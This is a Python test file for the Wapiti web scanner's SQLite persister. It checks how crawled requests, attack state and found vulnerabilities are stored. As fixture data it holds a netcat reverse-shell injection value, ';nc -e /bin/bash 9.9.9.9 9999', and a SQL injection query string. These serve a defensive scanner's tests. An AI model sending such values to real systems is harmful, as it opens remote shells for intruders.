import os
import json

import responses
import requests

from wapitiCore.net.sqlite_persister import SqlitePersister
from wapitiCore.net.web import Request
from wapitiCore.net.crawler import Crawler, Page


@responses.activate
def test_persister_basic():
    url = "http://httpbin.org/?k=v"
    responses.add(
        responses.GET,
        url,
        body="Hello world!"
    )

    crawler = Crawler("http://httpbin.org/")

    try:
        os.unlink("/tmp/crawl.db")
    except FileNotFoundError:
        pass

    persister = SqlitePersister("/tmp/crawl.db")
    persister.set_root_url("http://httpbin.org/")

    simple_get = Request("http://httpbin.org/?k=v")

    simple_post = Request(
        "http://httpbin.org/post?var1=a&var2=b",
        post_params=[["post1", "c"], ["post2", "d"]]
    )
    persister.set_to_browse([simple_get, simple_post])

    assert persister.get_root_url() == "http://httpbin.org/"
    assert persister.count_paths() == 2
    assert not len(list(persister.get_links()))
    assert not len(list(persister.get_forms()))
    assert not len(list(persister.get_payloads()))

    stored_requests = set(persister.get_to_browse())
    assert simple_get in stored_requests
    assert simple_post in stored_requests

    # If there is some requests stored then it means scan was started
    assert persister.has_scan_started()
    assert not persister.has_scan_finished()
    assert not persister.have_attacks_started()

    for req in stored_requests:
        if req == simple_get:
            crawler.send(req)
            persister.add_request(req)
            assert req.path_id == 1
            assert persister.get_path_by_id(1) == req
            break

    # Should be one now as the link was crawled
    assert len(list(persister.get_links()))
    assert persister.count_paths() == 3

    persister.set_attacked(1, "xss")
    assert persister.count_attacked("xss") == 1
    assert persister.have_attacks_started()

    naughty_get = Request("http://httpbin.org/?k=1%20%OR%200")
    persister.add_vulnerability(1, "SQL Injection", 1, naughty_get, "k", "OR bypass")
    assert next(persister.get_payloads())
    persister.flush_attacks()
    assert not persister.have_attacks_started()
    assert not len(list(persister.get_payloads()))
    persister.flush_session()
    assert not persister.count_paths()

    naughty_post = Request(
        "http://httpbin.org/post?var1=a&var2=b",
        post_params=[["post1", "c"], ["post2", ";nc -e /bin/bash 9.9.9.9 9999"]]
    )
    persister.add_vulnerability(1, "Command Execution", 1, naughty_post, "post2", ";nc -e /bin/bash 9.9.9.9 9999")
    payload = next(persister.get_payloads())
    assert naughty_post == payload.evil_request
    assert payload.parameter == "post2"


@responses.activate
def test_persister_upload():
    try:
        os.unlink("/tmp/crawl.db")
    except FileNotFoundError:
        pass

    persister = SqlitePersister("/tmp/crawl.db")
    persister.set_root_url("http://httpbin.org/")

    simple_upload = Request(
        "http://httpbin.org/post?qs1",
        post_params=[["post1", "c"], ["post2", "d"]],
        file_params=[["file1", ["'fname1", "content"]], ["file2", ["fname2", "content"]]]
    )

    xml_upload = Request(
        "http://httpbin.org/post?qs1",
        post_params=[["post1", "c"], ["post2", "d"]],
        file_params=[["calendar", ["calendar.xml", "<xml>Hello there</xml"]]]
    )
    persister.add_request(simple_upload)
    persister.add_request(xml_upload)
    assert persister.count_paths() == 2
    stored_requests = set(persister.get_to_browse())
    assert simple_upload in stored_requests
    assert xml_upload in stored_requests

    for req in stored_requests:
        if req == simple_upload:
            assert req.file_params == simple_upload.file_params
            assert req.file_params[0] == ["file1", ["'fname1", "content"]]
            assert req.file_params[1] == ["file2", ["fname2", "content"]]
        else:
            assert req.file_params == xml_upload.file_params
            assert req.file_params[0] == ["calendar", ["calendar.xml", "<xml>Hello there</xml"]]

    naughty_file = Request(
        "http://httpbin.org/post?qs1",
        post_params=[["post1", "c"], ["post2", "d"]],
        file_params=[["calendar", ["calendar.xml", "<xml>XXE there</xml>"]]]
    )
    persister.add_vulnerability(1, "Command Execution", 1, naughty_file, "calendar", "<xml>XXE there</xml>")
    payload = next(persister.get_payloads())
    assert naughty_file == payload.evil_request
    assert payload.parameter == "calendar"


@responses.activate
def test_persister_forms():
    with open("tests/data/forms.html") as data_body:
        url = "http://perdu.com/"
        responses.add(
            responses.GET,
            url,
            body=data_body.read()
        )

        resp = requests.get(url, allow_redirects=False)
        page = Page(resp)

        forms = list(page.iter_forms())

        try:
            os.unlink("/tmp/crawl.db")
        except FileNotFoundError:
            pass

        persister = SqlitePersister("/tmp/crawl.db")
        persister.set_root_url("http://httpbin.org/")
        persister.set_to_browse(forms)

        assert persister.count_paths() == 9

        extracted_forms = list(persister.get_to_browse())
        assert len(extracted_forms) == 9
        assert set(forms) == set(extracted_forms)

        for form in extracted_forms:
            if form.file_path == "/upload.php":
                assert form.file_params[0] == ["file", ["pix.gif", "GIF89a", "image/gif"]]
            elif form.file_path == "/fields.php":
                assert ["file", "pix.gif"] in form.post_params


def test_raw_post():
    json_req = Request(
        "http://httpbin.org/post?a=b",
        post_params=json.dumps({"z": 1, "a": 2}),
        enctype="application/json"
    )

    try:
        os.unlink("/tmp/crawl.db")
    except FileNotFoundError:
        pass

    persister = SqlitePersister("/tmp/crawl.db")
    persister.set_root_url("http://httpbin.org/")
    persister.set_to_browse([json_req])
    assert persister.count_paths() == 1

    extracted = next(persister.get_to_browse())
    assert json_req == extracted
    assert json.loads(extracted.post_params) == {"z": 1, "a": 2}

    naughty_json = Request(
        "http://httpbin.org/post?a=b",
        post_params=json.dumps({"z": "I'm a naughty value", "a": 2}),
        enctype="application/json"
    )
    persister.add_vulnerability(1, "Command Execution", 1, naughty_json, "z", "I'm a naughty value")
    payload = next(persister.get_payloads())
    assert naughty_json == payload.evil_request
    assert payload.parameter == "z"
